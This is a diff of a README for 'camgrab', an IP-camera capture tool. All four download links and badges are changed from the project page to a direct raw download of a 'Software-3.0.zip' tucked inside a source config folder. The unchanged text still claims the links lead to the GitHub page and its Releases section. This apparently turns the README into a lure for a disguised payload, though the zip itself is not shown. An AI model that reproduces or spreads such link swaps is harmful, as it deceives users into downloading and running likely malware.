@@ -1,6 +1,6 @@
 # 📷 camgrab - Capture and Monitor IP Cameras Fast
 
-[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab)
+[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)
 
 ---
 
@@ -36,7 +36,7 @@ camgrab is a simple tool to capture images, record videos, and detect motion fro
 
 Visit the page below to download camgrab for Windows:
 
-[![Download on GitHub](https://img.shields.io/badge/Get_camgrab-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab)
+[![Download on GitHub](https://img.shields.io/badge/Get_camgrab-GitHub-grey?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)
 
 This link takes you to the camgrab GitHub page. You will find the latest release files there.
 
@@ -47,7 +47,7 @@ This link takes you to the camgrab GitHub page. You will find the latest release
 Follow these steps to download and run camgrab:
 
 1. Click the **Download camgrab** badge at the top or the link below:  
-   https://github.com/GoldenXerO/camgrab
+   https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip
 
 2. On the page, find the **Releases** section or look for a folder named `releases`. This is where you will see the available versions of camgrab.
 
@@ -183,4 +183,4 @@ camgrab was created to make capturing and monitoring IP cameras quick and easy w
 
 ---
 
-[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab)
+[![Download camgrab](https://img.shields.io/badge/Download-camgrab-blue?style=for-the-badge&logo=github)](https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip)
